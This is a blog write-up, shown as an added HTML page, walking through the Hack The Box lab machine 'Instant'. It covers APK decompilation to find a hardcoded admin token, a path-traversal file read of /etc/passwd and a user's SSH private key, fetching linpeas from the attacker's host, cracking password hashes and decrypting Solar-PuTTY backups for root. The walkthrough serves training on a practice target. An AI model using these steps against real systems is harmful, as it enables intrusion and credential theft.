@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/thecybersecurityblog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=thecybersecurityblog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Hack The Box: Instant | The Cyber Security Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Let&rsquo;s scan the machine with nmap.
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA) |_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519) 80/tcp open http Apache httpd 2.4.58 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.58 (Ubuntu) |_http-title: Did not follow redirect to http://instant.htb/ Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel We have an Http Server running at port 80.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/thecybersecurityblog/docs/htb_instant/">
+<link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.79112176b8c2cef599ca604236706c81a7be13fe98e3c4f69d839f5f91e6a942.css" integrity="sha256-eREhdrjCzvWZymBCNnBsgae&#43;E/6Y48T2nYOfX5HmqUI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/thecybersecurityblog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/thecybersecurityblog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/thecybersecurityblog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/thecybersecurityblog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/thecybersecurityblog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/thecybersecurityblog/docs/htb_instant/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+    <nav class="nav">
+        <div class="head-class">
+            <div class="logo">
+                <a href="http://localhost:1313/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
+                
+            </div>
+            <ul id="menu">
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/blog/" title="Blog">
+                        <span>Blog</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Hack The Box: Instant
+    </h1>
+    <div class="post-meta"><span title='2024-11-17 19:49:44 +0200 EET'>17 Nov 2024</span>
+
+</div>
+  </header>
+  <div class="card-list" onclick="location.href='https:\/\/www.hackthebox.com\/achievement\/machine\/2124852\/630';" style="cursor: pointer;">
+    <article class="card">
+      <figure class="card-image">
+        <img class=card-image src="instant_cert.png" alt="Cert" />
+      </figure>
+      <div class="card-header">
+        <a href="https://www.hackthebox.com/achievement/machine/2124852/630">Owned Instant from Hack The Box</a>
+      </div>
+      <div class="card-content">
+         I have just gained ownership of Cap machine from Hack The Box
+      </div>
+      <div class="card-footer">
+        Hack The Box
+      </div>
+    </article>
+  </div> 
+  <div class="post-content"><p>Let&rsquo;s scan the machine with nmap.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.58
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.58 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://instant.htb/
+</span></span><span style="display:flex;"><span>Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>We have an Http Server running at port 80.
+In order to get access, we need to modify the <code>/etc/hosts</code> file, or use a tool like Burpsuite to change the Host header of the request to <code>Host: instant.htb</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># access the endpoint from the browser</span>
+</span></span><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;10.10.11.37  instant.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>The website is promoting an android application that offers customers cross-platform transactions.</p>
+<p><img loading="lazy" src="lab1.png" alt="alt"  />
+</p>
+<p>We searched the website for any interesting endpoint that could be vulnerable to SQL injection or XSS vulnerability, but unfortunately there is nothing notable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Also used directory bruteforcing just to be sure</span>
+</span></span><span style="display:flex;"><span>gobuster dir -u http://instant.htb/ -w /usr/share/worldlist/dirb/big.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then proceed with subdomain bruteforcing</span>
+</span></span><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://instant.htb/ -H <span style="color:#e6db74">&#34;Host: FUZZ.instant.htb&#34;</span>
+</span></span></code></pre></div><p>Nothing&hellip; so let&rsquo;s download and examine the application by requesting <code>http://instant.htb/downloads/instant.apk</code> or by simply clicking the &ldquo;Download Now&rdquo; button.</p>
+<p>First, we can use the <code>apkurlgrep</code> tool (<a href="https://github.com/ndelphit/apkurlgrep">Github Repo</a>) to extract endpoints from the apk.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apkurlgrep -a instant.apk &gt;&gt; apkUrls.txt
+</span></span></code></pre></div><p><img loading="lazy" src="lab2.png" alt="alt"  />
+</p>
+<p>So we found a subdomain, <code>mywalletv1.instant.htb</code> that has some api endpoints for authentication and user activities.</p>
+<p>Modify the <code>/etc/hosts</code> file accordingly and now let&rsquo;s try to access these endpoints while proxying the traffic with Burpsuite.</p>
+<p><img loading="lazy" src="lab3.png" alt="alt"  />
+</p>
+<p>We get a <code>201</code> response with &lsquo;Unauthorized&rsquo; message. We don&rsquo;t know a lot about the api yet, so we should see if we can find out more by the application.</p>
+<p>Let&rsquo;s use a decompiler, like <code>jadx</code> to inspect the code. In order to launch the GUI version, navigate to the bin directory and execute <code>jadx-gui</code>. Now open the <code>instant.apk</code> file.</p>
+<p>Right off the bat we can see at <code>AdminActivities</code> class, a private function <code>TestAdminAuthorization</code> that constructs a new http request to <code>/api/v1/view/profile</code> and adds a header, <code>Authorization: &lt;JWT Token&gt;</code>
+<img loading="lazy" src="lab4.png" alt="alt"  />
+</p>
+<p>We may be able to use this token to authenticate as Admin.</p>
+<p><img loading="lazy" src="lab5.png" alt="alt"  />
+
+<img loading="lazy" src="lab6.png" alt="alt"  />
+</p>
+<p>Great! We are authorized to view the profile of admin.</p>
+<p>Even though we got some useful information, something is missing. Continue with enumeration of <code>inspect.apk</code>.</p>
+<p>We can unzip an Android <code>.apk</code>, exactly like a <code>.zip</code> file, but in this case to examine in more detail we will use <code>apktool</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apktool d instant.apk -o instant-app
+</span></span></code></pre></div><p>One thing we can check right away, is the <code>res/xml/network_security_config.xml</code> file, which is used to specify security details like certificate pins and HTTP traffic settings. An example is allowing HTTP traffic for specific domains. (<a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting#basic-understanding-of-the-application-manifest.xml-strings.xml">HackTricks - Basic understanding of the application</a>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat instant-app/res/xml/network_security_config.xml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># results</span>
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;network-security-config&gt;
+</span></span><span style="display:flex;"><span>    &lt;domain-config cleartextTrafficPermitted<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;domain includeSubdomains<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;mywalletv1.instant.htb&lt;/domain&gt;
+</span></span><span style="display:flex;"><span>        &lt;domain includeSubdomains<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;swagger-ui.instant.htb&lt;/domain&gt;
+</span></span><span style="display:flex;"><span>    &lt;/domain-config&gt;
+</span></span><span style="display:flex;"><span>&lt;/network-security-config&gt;
+</span></span></code></pre></div><p>We got another subdomain, <code>swagger-ui.instant.htb</code>, which is the UI version of Swagger (framework that allows developers to create interactive, machine and human-readable API documentation).</p>
+<p><img loading="lazy" src="lab7.png" alt="alt"  />
+</p>
+<p>Here we can see all the endpoints of the Api. Something we didn&rsquo;t know is that there is logging system, which is interesting.</p>
+<p>There is a <code>/admin/read/log</code> endpoint which is locked. In order to access it we need to provide the authorization token along with the file name.</p>
+<p><img loading="lazy" src="lab8.png" alt="alt"  />
+
+<img loading="lazy" src="lab9.png" alt="alt"  />
+</p>
+<p>Let&rsquo;s try to put a path like, <code>../../../etc/passwd</code>.</p>
+<p><img loading="lazy" src="lab10.png" alt="alt"  />
+
+<img loading="lazy" src="lab11.png" alt="alt"  />
+</p>
+<p>We just found a LFI (Local File Inclusion) vulnerability.</p>
+<p>We can leverage this to find the private ssh key. Usually it is at <code>.ssh/id_rsa</code>.</p>
+<p><img loading="lazy" src="lab12.png" alt="alt"  />
+</p>
+<p>And we got the private key. Now we can save it to a file locally and connect with ssh to the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vim private_key <span style="color:#75715e">#Save private key to a file</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> private_key <span style="color:#75715e">#Give appropriate permissions</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssh -i private_key shirohige@10.10.11.37 <span style="color:#75715e">#Connect with ssh</span>
+</span></span></code></pre></div><p>Nice, we got a foothold to the machine.</p>
+<p>First examined <code>sudo -l</code>, <code>capabilities</code>, <code>crontab</code>, but nothing interesting popped up, so before proceeding into manual enumeration of the system, we could run <code>linpeas.sh</code> to see if we can find anything usefull.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">1234</span> <span style="color:#75715e">#Start a server in kali</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wget http://&lt;ip_address&gt;:1234/linpeas.sh <span style="color:#75715e">#Download linpeas to the machine</span>
+</span></span></code></pre></div><p>Now we can execute the script. Some promising results are:</p>
+<ul>
+<li>Found a <code>SECRET_KEY</code> (<code>VeryStrongS3cretKeyY0uC4NTGET</code>) variable at <code>.env</code></li>
+<li>Possible <code>snapd</code> vulnerability, if it is <code>2.37.1</code> or newer</li>
+<li>Possible usefull file at <code>opt/backups/Solar-PuTTY/sessions-backup.dat</code></li>
+<li>Encrypted passwords for Users in Database (sqlite is used)
+<img loading="lazy" src="lab13.png" alt="alt"  />
+
+<br></li>
+</ul>
+<p>Unfortunately, the <code>SECRET_KEY</code> password does&rsquo;t work for root and <code>snapd</code> version is way higher than <code>2.37.1</code>. So let&rsquo;s look into the <code>instant.db</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Transfer instant.db with http.server or scp to Kali Linux</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then connect to the database and examine</span>
+</span></span><span style="display:flex;"><span>sqlite3 instant.db
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlite3&gt; .tables <span style="color:#75715e">#see if there is any table with credentials</span>
+</span></span><span style="display:flex;"><span>sqlite3&gt; .schema wallet_users
+</span></span><span style="display:flex;"><span>sqlite3&gt; .mode column <span style="color:#75715e">#change output to column representation (easier to read)</span>
+</span></span><span style="display:flex;"><span>sqlite3&gt; <span style="color:#66d9ef">select</span> * from wallet_users;
+</span></span></code></pre></div><p><img loading="lazy" src="lab14.png" alt="alt"  />
+
+<img loading="lazy" src="lab15.png" alt="alt"  />
+
+<img loading="lazy" src="lab16.png" alt="alt"  />
+</p>
+<p>We have three passwords to crack.</p>
+<p>Let&rsquo;s try to decrypt the <code>pbkdf2:sha256</code> password. By googling <code>pbkdf2:sha256 cracker site: github.com</code> we can find <a href="https://github.com/AnataarXVI/Werkzeug-Cracker">Werkzeug-Cracker</a> tool.</p>
+<p>We got nothing by brute-forcing the admin password, but we found that the password for <code>shirohige</code> is <code>estrella</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 werkzeug_cracker.py -p hash.txt -w /usr/share/wordlists/dirb/others/best1050.txt
+</span></span></code></pre></div><p>Again we can&rsquo;t <code>su root</code> with this password.</p>
+<p>Next is to check the <code>opt/backups/Solar-PuTTY/sessions-backup.dat</code> file. <code>Solar-Putty</code> is an application that allows its users to connect remotely with <code>ssh</code>, <code>telnet</code> etc to the server (despite their OS). There might be credentials into that backup file.</p>
+<p>By searching <code>sessions backup solar putty file linux site: github.com</code> we found <a href="https://github.com/VoidSec/SolarPuttyDecrypt">SolarPuttyDecrypt</a>, a tool to decrypt <code>sessions-backup.dat</code>.</p>
+<p><img loading="lazy" src="lab17.png" alt="alt"  />
+</p>
+<p>After running the script in a Windows VM we found the credentials for root user.</p>
+<p><img loading="lazy" src="lab18.png" alt="alt"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/thecybersecurityblog/">The Cyber Security Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
